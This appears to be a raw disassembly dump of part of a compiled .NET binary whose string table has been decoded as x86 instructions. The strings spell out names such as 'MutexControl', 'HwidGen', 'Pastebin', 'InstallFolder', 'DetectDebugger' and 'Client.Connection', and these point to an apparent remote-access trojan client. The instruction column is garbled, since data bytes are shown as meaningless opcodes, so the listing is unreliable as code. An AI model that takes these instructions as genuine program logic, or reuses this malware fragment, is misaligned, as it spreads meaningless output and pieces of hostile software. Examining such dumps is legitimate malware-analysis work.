  408743:	32 2e                	xor    (%esi),%ch
  408745:	64 6c                	fs insb (%dx),%es:(%edi)
  408747:	6c                   	insb   (%dx),%es:(%edi)
  408748:	00 6e 74             	add    %ch,0x74(%esi)
  40874b:	64 6c                	fs insb (%dx),%es:(%edi)
  40874d:	6c                   	insb   (%dx),%es:(%edi)
  40874e:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408751:	6c                   	insb   (%dx),%es:(%edi)
  408752:	00 4b 69             	add    %cl,0x69(%ebx)
  408755:	6c                   	insb   (%dx),%es:(%edi)
  408756:	6c                   	insb   (%dx),%es:(%edi)
  408757:	00 50 6f             	add    %dl,0x6f(%eax)
  40875a:	6c                   	insb   (%dx),%es:(%edi)
  40875b:	6c                   	insb   (%dx),%es:(%edi)
  40875c:	00 57 72             	add    %dl,0x72(%edi)
  40875f:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  408766:	00 
  408767:	53                   	push   %ebx
  408768:	65 74 41             	gs je  0x4087ac
  40876b:	73 4e                	jae    0x4087bb
  40876d:	75 6c                	jne    0x4087db
  40876f:	6c                   	insb   (%dx),%es:(%edi)
  408770:	00 4d 75             	add    %cl,0x75(%ebp)
  408773:	74 65                	je     0x4087da
  408775:	78 43                	js     0x4087ba
  408777:	6f                   	outsl  %ds:(%esi),(%dx)
  408778:	6e                   	outsb  %ds:(%esi),(%dx)
  408779:	74 72                	je     0x4087ed
  40877b:	6f                   	outsl  %ds:(%esi),(%dx)
  40877c:	6c                   	insb   (%dx),%es:(%edi)
  40877d:	00 45 6e             	add    %al,0x6e(%ebp)
  408780:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408783:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  408787:	72 65                	jb     0x4087ee
  408789:	61                   	popa
  40878a:	6d                   	insl   (%dx),%es:(%edi)
  40878b:	00 46 69             	add    %al,0x69(%esi)
  40878e:	6c                   	insb   (%dx),%es:(%edi)
  40878f:	65 53                	gs push %ebx
  408791:	74 72                	je     0x408805
  408793:	65 61                	gs popa
  408795:	6d                   	insl   (%dx),%es:(%edi)
  408796:	00 4e 65             	add    %cl,0x65(%esi)
  408799:	74 77                	je     0x408812
  40879b:	6f                   	outsl  %ds:(%esi),(%dx)
  40879c:	72 6b                	jb     0x408809
  40879e:	53                   	push   %ebx
  40879f:	74 72                	je     0x408813
  4087a1:	65 61                	gs popa
  4087a3:	6d                   	insl   (%dx),%es:(%edi)
  4087a4:	00 53 73             	add    %dl,0x73(%ebx)
  4087a7:	6c                   	insb   (%dx),%es:(%edi)
  4087a8:	53                   	push   %ebx
  4087a9:	74 72                	je     0x40881d
  4087ab:	65 61                	gs popa
  4087ad:	6d                   	insl   (%dx),%es:(%edi)
  4087ae:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b3:	64 65 46             	fs gs inc %esi
  4087b6:	72 6f                	jb     0x408827
  4087b8:	6d                   	insl   (%dx),%es:(%edi)
  4087b9:	53                   	push   %ebx
  4087ba:	74 72                	je     0x40882e
  4087bc:	65 61                	gs popa
  4087be:	6d                   	insl   (%dx),%es:(%edi)
  4087bf:	00 43 72             	add    %al,0x72(%ebx)
  4087c2:	79 70                	jns    0x408834
  4087c4:	74 6f                	je     0x408835
  4087c6:	53                   	push   %ebx
  4087c7:	74 72                	je     0x40883b
  4087c9:	65 61                	gs popa
  4087cb:	6d                   	insl   (%dx),%es:(%edi)
  4087cc:	00 47 5a             	add    %al,0x5a(%edi)
  4087cf:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087d6:	6d                   	insl   (%dx),%es:(%edi)
  4087d7:	00 4d 65             	add    %cl,0x65(%ebp)
  4087da:	6d                   	insl   (%dx),%es:(%edi)
  4087db:	6f                   	outsl  %ds:(%esi),(%dx)
  4087dc:	72 79                	jb     0x408857
  4087de:	53                   	push   %ebx
  4087df:	74 72                	je     0x408853
  4087e1:	65 61                	gs popa
  4087e3:	6d                   	insl   (%dx),%es:(%edi)
  4087e4:	00 50 72             	add    %dl,0x72(%eax)
  4087e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e8:	67 72 61             	addr16 jb 0x40884c
  4087eb:	6d                   	insl   (%dx),%es:(%edi)
  4087ec:	00 67 65             	add    %ah,0x65(%edi)
  4087ef:	74 5f                	je     0x408850
  4087f1:	49                   	dec    %ecx
  4087f2:	74 65                	je     0x408859
  4087f4:	6d                   	insl   (%dx),%es:(%edi)
  4087f5:	00 67 65             	add    %ah,0x65(%edi)
  4087f8:	74 5f                	je     0x408859
  4087fa:	49                   	dec    %ecx
  4087fb:	73 36                	jae    0x408833
  4087fd:	34 42                	xor    $0x42,%al
  4087ff:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408806:	74 
  408807:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  40880e:	65 6d                	gs insl (%dx),%es:(%edi)
  408810:	00 43 6c             	add    %al,0x6c(%ebx)
  408813:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  40881a:	67 6f                	outsl  %ds:(%si),(%dx)
  40881c:	72 69                	jb     0x408887
  40881e:	74 68                	je     0x408888
  408820:	6d                   	insl   (%dx),%es:(%edi)
  408821:	00 53 79             	add    %dl,0x79(%ebx)
  408824:	6d                   	insl   (%dx),%es:(%edi)
  408825:	6d                   	insl   (%dx),%es:(%edi)
  408826:	65 74 72             	gs je  0x40889b
  408829:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408830:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408837:	79 
  408838:	6d                   	insl   (%dx),%es:(%edi)
  408839:	6d                   	insl   (%dx),%es:(%edi)
  40883a:	65 74 72             	gs je  0x4088af
  40883d:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408844:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40884b:	73 
  40884c:	68 41 6c 67 6f       	push   $0x6f676c41
  408851:	72 69                	jb     0x4088bc
  408853:	74 68                	je     0x4088bd
  408855:	6d                   	insl   (%dx),%es:(%edi)
  408856:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40885a:	6d                   	insl   (%dx),%es:(%edi)
  40885b:	00 52 61             	add    %dl,0x61(%edx)
  40885e:	6e                   	outsb  %ds:(%esi),(%dx)
  40885f:	64 6f                	outsl  %fs:(%esi),(%dx)
  408861:	6d                   	insl   (%dx),%es:(%edi)
  408862:	00 49 43             	add    %cl,0x43(%ecx)
  408865:	72 79                	jb     0x4088e0
  408867:	70 74                	jo     0x4088dd
  408869:	6f                   	outsl  %ds:(%esi),(%dx)
  40886a:	54                   	push   %esp
  40886b:	72 61                	jb     0x4088ce
  40886d:	6e                   	outsb  %ds:(%esi),(%dx)
  40886e:	73 66                	jae    0x4088d6
  408870:	6f                   	outsl  %ds:(%esi),(%dx)
  408871:	72 6d                	jb     0x4088e0
  408873:	00 4d 73             	add    %cl,0x73(%ebp)
  408876:	67 50                	addr16 push %eax
  408878:	61                   	popa
  408879:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  40887c:	6e                   	outsb  %ds:(%esi),(%dx)
  40887d:	75 6d                	jne    0x4088ec
  40887f:	00 57 72             	add    %dl,0x72(%edi)
  408882:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  408889:	65 
  40888a:	61                   	popa
  40888b:	6e                   	outsb  %ds:(%esi),(%dx)
  40888c:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408890:	6f                   	outsl  %ds:(%esi),(%dx)
  408891:	6f                   	outsl  %ds:(%esi),(%dx)
  408892:	6c                   	insb   (%dx),%es:(%edi)
  408893:	65 61                	gs popa
  408895:	6e                   	outsb  %ds:(%esi),(%dx)
  408896:	00 53 65             	add    %dl,0x65(%ebx)
  408899:	74 41                	je     0x4088dc
  40889b:	73 42                	jae    0x4088df
  40889d:	6f                   	outsl  %ds:(%esi),(%dx)
  40889e:	6f                   	outsl  %ds:(%esi),(%dx)
  40889f:	6c                   	insb   (%dx),%es:(%edi)
  4088a0:	65 61                	gs popa
  4088a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a3:	00 48 77             	add    %cl,0x77(%eax)
  4088a6:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088ad:	65 
  4088ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4088af:	00 63 68             	add    %ah,0x68(%ebx)
  4088b2:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088b9:	4d 
  4088ba:	61                   	popa
  4088bb:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088c2:	43                   	inc    %ebx
  4088c3:	68 61 69 6e 00       	push   $0x6e6961
  4088c8:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088cb:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d3:	6d                   	insl   (%dx),%es:(%edi)
  4088d4:	61                   	popa
  4088d5:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088dc:	43                   	inc    %ebx
  4088dd:	75 72                	jne    0x408951
  4088df:	72 65                	jb     0x408946
  4088e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e2:	74 44                	je     0x408928
  4088e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e5:	6d                   	insl   (%dx),%es:(%edi)
  4088e6:	61                   	popa
  4088e7:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088ee:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088f2:	00 49 73             	add    %cl,0x73(%ecx)
  4088f5:	41                   	inc    %ecx
  4088f6:	64 6d                	fs insl (%dx),%es:(%edi)
  4088f8:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4088ff:	00 47 65             	add    %al,0x65(%edi)
  408902:	74 46                	je     0x40894a
  408904:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40890b:	57 
  40890c:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408913:	78 
  408914:	74 65                	je     0x40897b
  408916:	6e                   	outsb  %ds:(%esi),(%dx)
  408917:	73 69                	jae    0x408982
  408919:	6f                   	outsl  %ds:(%esi),(%dx)
  40891a:	6e                   	outsb  %ds:(%esi),(%dx)
  40891b:	00 67 65             	add    %ah,0x65(%edi)
  40891e:	74 5f                	je     0x40897f
  408920:	4f                   	dec    %edi
  408921:	53                   	push   %ebx
  408922:	56                   	push   %esi
  408923:	65 72 73             	gs jb  0x408999
  408926:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40892d:	74 65                	je     0x408994
  40892f:	6d                   	insl   (%dx),%es:(%edi)
  408930:	2e 49                	cs dec %ecx
  408932:	4f                   	dec    %edi
  408933:	2e 43                	cs inc %ebx
  408935:	6f                   	outsl  %ds:(%esi),(%dx)
  408936:	6d                   	insl   (%dx),%es:(%edi)
  408937:	70 72                	jo     0x4089ab
  408939:	65 73 73             	gs jae 0x4089af
  40893c:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408943:	6c                   	insb   (%dx),%es:(%edi)
  408944:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40894b:	00 53 79             	add    %dl,0x79(%ebx)
  40894e:	73 74                	jae    0x4089c4
  408950:	65 6d                	gs insl (%dx),%es:(%edi)
  408952:	2e 53                	cs push %ebx
  408954:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408958:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  40895f:	68 
  408960:	65 6e                	outsb  %gs:(%esi),(%dx)
  408962:	74 69                	je     0x4089cd
  408964:	63 61 74             	arpl   %esp,0x74(%ecx)
  408967:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40896e:	74 65                	je     0x4089d5
  408970:	6d                   	insl   (%dx),%es:(%edi)
  408971:	2e 52                	cs push %edx
  408973:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408976:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40897b:	6e                   	outsb  %ds:(%esi),(%dx)
  40897c:	00 58 35             	add    %bl,0x35(%eax)
  40897f:	30 39                	xor    %bh,(%ecx)
  408981:	43                   	inc    %ebx
  408982:	65 72 74             	gs jb  0x4089f9
  408985:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40898c:	43                   	inc    %ebx
  40898d:	6f                   	outsl  %ds:(%esi),(%dx)
  40898e:	6c                   	insb   (%dx),%es:(%edi)
  40898f:	6c                   	insb   (%dx),%es:(%edi)
  408990:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408995:	6e                   	outsb  %ds:(%esi),(%dx)
  408996:	00 4d 61             	add    %cl,0x61(%ebp)
  408999:	6e                   	outsb  %ds:(%esi),(%dx)
  40899a:	61                   	popa
  40899b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40899e:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089a0:	74 4f                	je     0x4089f1
  4089a2:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089a5:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089a9:	6c                   	insb   (%dx),%es:(%edi)
  4089aa:	6c                   	insb   (%dx),%es:(%edi)
  4089ab:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b1:	00 43 6c             	add    %al,0x6c(%ebx)
  4089b4:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4089bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4089bd:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c3:	00 73 65             	add    %dh,0x65(%ebx)
  4089c6:	74 5f                	je     0x408a27
  4089c8:	50                   	push   %eax
  4089c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ca:	73 69                	jae    0x408a35
  4089cc:	74 69                	je     0x408a37
  4089ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4089cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d0:	00 70 6f             	add    %dh,0x6f(%eax)
  4089d3:	73 69                	jae    0x408a3e
  4089d5:	74 69                	je     0x408a40
  4089d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d9:	00 43 72             	add    %al,0x72(%ebx)
  4089dc:	79 70                	jns    0x408a4e
  4089de:	74 6f                	je     0x408a4f
  4089e0:	67 72 61             	addr16 jb 0x408a44
  4089e3:	70 68                	jo     0x408a4d
  4089e5:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089ec:	74 69                	je     0x408a57
  4089ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f0:	00 41 72             	add    %al,0x72(%ecx)
  4089f3:	67 75 6d             	addr16 jne 0x408a63
  4089f6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089f8:	74 4e                	je     0x408a48
  4089fa:	75 6c                	jne    0x408a68
  4089fc:	6c                   	insb   (%dx),%es:(%edi)
  4089fd:	45                   	inc    %ebp
  4089fe:	78 63                	js     0x408a63
  408a00:	65 70 74             	gs jo  0x408a77
  408a03:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a0a:	75 6d                	jne    0x408a79
  408a0c:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a0e:	74 45                	je     0x408a55
  408a10:	78 63                	js     0x408a75
  408a12:	65 70 74             	gs jo  0x408a89
  408a15:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a1c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a1d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a1e:	77 6e                	ja     0x408a8e
  408a20:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a23:	61                   	popa
  408a24:	67 65 43             	addr16 gs inc %ebx
  408a27:	6f                   	outsl  %ds:(%esi),(%dx)
  408a28:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a2d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a2f:	00 53 65             	add    %dl,0x65(%ebx)
  408a32:	6e                   	outsb  %ds:(%esi),(%dx)
  408a33:	64 49                	fs dec %ecx
  408a35:	6e                   	outsb  %ds:(%esi),(%dx)
  408a36:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a38:	00 46 69             	add    %al,0x69(%esi)
  408a3b:	6c                   	insb   (%dx),%es:(%edi)
  408a3c:	65 49                	gs dec %ecx
  408a3e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a41:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a45:	76 65                	jbe    0x408aac
  408a47:	49                   	dec    %ecx
  408a48:	6e                   	outsb  %ds:(%esi),(%dx)
  408a49:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a4b:	00 46 69             	add    %al,0x69(%esi)
  408a4e:	6c                   	insb   (%dx),%es:(%edi)
  408a4f:	65 53                	gs push %ebx
  408a51:	79 73                	jns    0x408ac6
  408a53:	74 65                	je     0x408aba
  408a55:	6d                   	insl   (%dx),%es:(%edi)
  408a56:	49                   	dec    %ecx
  408a57:	6e                   	outsb  %ds:(%esi),(%dx)
  408a58:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a5a:	00 43 6f             	add    %al,0x6f(%ebx)
  408a5d:	6d                   	insl   (%dx),%es:(%edi)
  408a5e:	70 75                	jo     0x408ad5
  408a60:	74 65                	je     0x408ac7
  408a62:	72 49                	jb     0x408aad
  408a64:	6e                   	outsb  %ds:(%esi),(%dx)
  408a65:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a67:	00 43 53             	add    %al,0x53(%ebx)
  408a6a:	68 61 72 70 41       	push   $0x41707261
  408a6f:	72 67                	jb     0x408ad8
  408a71:	75 6d                	jne    0x408ae0
  408a73:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a75:	74 49                	je     0x408ac0
  408a77:	6e                   	outsb  %ds:(%esi),(%dx)
  408a78:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a7a:	00 50 72             	add    %dl,0x72(%eax)
  408a7d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a7e:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a81:	73 53                	jae    0x408ad6
  408a83:	74 61                	je     0x408ae6
  408a85:	72 74                	jb     0x408afb
  408a87:	49                   	dec    %ecx
  408a88:	6e                   	outsb  %ds:(%esi),(%dx)
  408a89:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a8b:	00 57 72             	add    %dl,0x72(%edi)
  408a8e:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408a95:	50 
  408a96:	72 65                	jb     0x408afd
  408a98:	76 65                	jbe    0x408aff
  408a9a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a9b:	74 53                	je     0x408af0
  408a9d:	6c                   	insb   (%dx),%es:(%edi)
  408a9e:	65 65 70 00          	gs gs jo 0x408aa2
  408aa2:	5a                   	pop    %edx
  408aa3:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408aaa:	65 6e                	outsb  %gs:(%esi),(%dx)
  408aac:	74 41                	je     0x408aef
  408aae:	70 70                	jo     0x408b20
  408ab0:	00 4d 69             	add    %cl,0x69(%ebp)
  408ab3:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408ab6:	73 6f                	jae    0x408b27
  408ab8:	66 74 2e             	data16 je 0x408ae9
  408abb:	43                   	inc    %ebx
  408abc:	53                   	push   %ebx
  408abd:	68 61 72 70 00       	push   $0x707261
  408ac2:	47                   	inc    %edi
  408ac3:	72 6f                	jb     0x408b34
  408ac5:	75 70                	jne    0x408b37
  408ac7:	00 4e 6f             	add    %cl,0x6f(%esi)
  408aca:	72 6d                	jb     0x408b39
  408acc:	61                   	popa
  408acd:	6c                   	insb   (%dx),%es:(%edi)
  408ace:	53                   	push   %ebx
  408acf:	74 61                	je     0x408b32
  408ad1:	72 74                	jb     0x408b47
  408ad3:	75 70                	jne    0x408b45
  408ad5:	00 53 79             	add    %dl,0x79(%ebx)
  408ad8:	73 74                	jae    0x408b4e
  408ada:	65 6d                	gs insl (%dx),%es:(%edi)
  408adc:	2e 4c                	cs dec %esp
  408ade:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408ae5:	61                   	popa
  408ae6:	72 00                	jb     0x408ae8
  408ae8:	43                   	inc    %ebx
  408ae9:	68 61 72 00 49       	push   $0x49007261
  408aee:	6e                   	outsb  %ds:(%esi),(%dx)
  408aef:	76 6f                	jbe    0x408b60
  408af1:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408af5:	6d                   	insl   (%dx),%es:(%edi)
  408af6:	62 65 72             	bound  %esp,0x72(%ebp)
  408af9:	00 4d 44             	add    %cl,0x44(%ebp)
  408afc:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b01:	74 6f                	je     0x408b72
  408b03:	53                   	push   %ebx
  408b04:	65 72 76             	gs jb  0x408b7d
  408b07:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b0e:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b15:	41 
  408b16:	43                   	inc    %ebx
  408b17:	72 79                	jb     0x408b92
  408b19:	70 74                	jo     0x408b8f
  408b1b:	6f                   	outsl  %ds:(%esi),(%dx)
  408b1c:	53                   	push   %ebx
  408b1d:	65 72 76             	gs jb  0x408b96
  408b20:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b27:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b2e:	73 
  408b2f:	43                   	inc    %ebx
  408b30:	72 79                	jb     0x408bab
  408b32:	70 74                	jo     0x408ba8
  408b34:	6f                   	outsl  %ds:(%esi),(%dx)
  408b35:	53                   	push   %ebx
  408b36:	65 72 76             	gs jb  0x408baf
  408b39:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b40:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b47:	72 
  408b48:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b4f:	64 65 72 00          	fs gs jb 0x408b53
  408b53:	49                   	dec    %ecx
  408b54:	6e                   	outsb  %ds:(%esi),(%dx)
  408b55:	73 74                	jae    0x408bcb
  408b57:	61                   	popa
  408b58:	6c                   	insb   (%dx),%es:(%edi)
  408b59:	6c                   	insb   (%dx),%es:(%edi)
  408b5a:	46                   	inc    %esi
  408b5b:	6f                   	outsl  %ds:(%esi),(%dx)
  408b5c:	6c                   	insb   (%dx),%es:(%edi)
  408b5d:	64 65 72 00          	fs gs jb 0x408b61
  408b61:	49                   	dec    %ecx
  408b62:	64 53                	fs push %ebx
  408b64:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b66:	64 65 72 00          	fs gs jb 0x408b6a
  408b6a:	73 65                	jae    0x408bd1
  408b6c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b6d:	64 65 72 00          	fs gs jb 0x408b71
  408b71:	4d                   	dec    %ebp
  408b72:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b79:	74 2e                	je     0x408ba9
  408b7b:	43                   	inc    %ebx
  408b7c:	53                   	push   %ebx
  408b7d:	68 61 72 70 2e       	push   $0x2e707261
  408b82:	52                   	push   %edx
  408b83:	75 6e                	jne    0x408bf3
  408b85:	74 69                	je     0x408bf0
  408b87:	6d                   	insl   (%dx),%es:(%edi)
  408b88:	65 42                	gs inc %edx
  408b8a:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408b91:	61                   	popa
  408b92:	6c                   	insb   (%dx),%es:(%edi)
  408b93:	6c                   	insb   (%dx),%es:(%edi)
  408b94:	53                   	push   %ebx
  408b95:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408b9c:	65 
  408b9d:	72 00                	jb     0x408b9f
  408b9f:	47                   	inc    %edi
  408ba0:	65 74 45             	gs je  0x408be8
  408ba3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ba4:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408ba7:	65 72 00             	gs jb  0x408baa
  408baa:	67 65 74 5f          	addr16 gs je 0x408c0d
  408bae:	42                   	inc    %edx
  408baf:	75 66                	jne    0x408c17
  408bb1:	66 65 72 00          	data16 gs jb 0x408bb5
  408bb5:	73 65                	jae    0x408c1c
  408bb7:	74 5f                	je     0x408c18
  408bb9:	42                   	inc    %edx
  408bba:	75 66                	jne    0x408c22
  408bbc:	66 65 72 00          	data16 gs jb 0x408bc0
  408bc0:	57                   	push   %edi
  408bc1:	72 69                	jb     0x408c2c
  408bc3:	74 65                	je     0x408c2a
  408bc5:	49                   	dec    %ecx
  408bc6:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc7:	74 65                	je     0x408c2e
  408bc9:	67 65 72 00          	addr16 gs jb 0x408bcd
  408bcd:	67 65 74 5f          	addr16 gs je 0x408c30
  408bd1:	41                   	inc    %ecx
  408bd2:	73 49                	jae    0x408c1d
  408bd4:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd5:	74 65                	je     0x408c3c
  408bd7:	67 65 72 00          	addr16 gs jb 0x408bdb
  408bdb:	73 65                	jae    0x408c42
  408bdd:	74 5f                	je     0x408c3e
  408bdf:	41                   	inc    %ecx
  408be0:	73 49                	jae    0x408c2b
  408be2:	6e                   	outsb  %ds:(%esi),(%dx)
  408be3:	74 65                	je     0x408c4a
  408be5:	67 65 72 00          	addr16 gs jb 0x408be9
  408be9:	47                   	inc    %edi
  408bea:	65 74 41             	gs je  0x408c2e
  408bed:	73 49                	jae    0x408c38
  408bef:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf0:	74 65                	je     0x408c57
  408bf2:	67 65 72 00          	addr16 gs jb 0x408bf6
  408bf6:	53                   	push   %ebx
  408bf7:	65 74 41             	gs je  0x408c3b
  408bfa:	73 49                	jae    0x408c45
  408bfc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bfd:	74 65                	je     0x408c64
  408bff:	67 65 72 00          	addr16 gs jb 0x408c03
  408c03:	44                   	inc    %esp
  408c04:	65 74 65             	gs je  0x408c6c
  408c07:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c0b:	62 75 67             	bound  %esi,0x67(%ebp)
  408c0e:	67 65 72 00          	addr16 gs jb 0x408c12
  408c12:	4d                   	dec    %ebp
  408c13:	61                   	popa
  408c14:	6e                   	outsb  %ds:(%esi),(%dx)
  408c15:	61                   	popa
  408c16:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c19:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c1b:	74 4f                	je     0x408c6c
  408c1d:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c20:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c24:	61                   	popa
  408c25:	72 63                	jb     0x408c8a
  408c27:	68 65 72 00 53       	push   $0x53007265
  408c2c:	65 73 73             	gs jae 0x408ca2
  408c2f:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c36:	6e                   	outsb  %ds:(%esi),(%dx)
  408c37:	67 45                	addr16 inc %ebp
  408c39:	76 65                	jbe    0x408ca0
  408c3b:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3c:	74 48                	je     0x408c86
  408c3e:	61                   	popa
  408c3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c40:	64 6c                	fs insb (%dx),%es:(%edi)
  408c42:	65 72 00             	gs jb  0x408c45
  408c45:	54                   	push   %esp
  408c46:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c4d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c4e:	65 72 00             	gs jb  0x408c51
  408c51:	43                   	inc    %ebx
  408c52:	6c                   	insb   (%dx),%es:(%edi)
  408c53:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c5a:	6c                   	insb   (%dx),%es:(%edi)
  408c5b:	70 65                	jo     0x408cc2
  408c5d:	72 00                	jb     0x408c5f
  408c5f:	54                   	push   %esp
  408c60:	6f                   	outsl  %ds:(%esi),(%dx)
  408c61:	55                   	push   %ebp
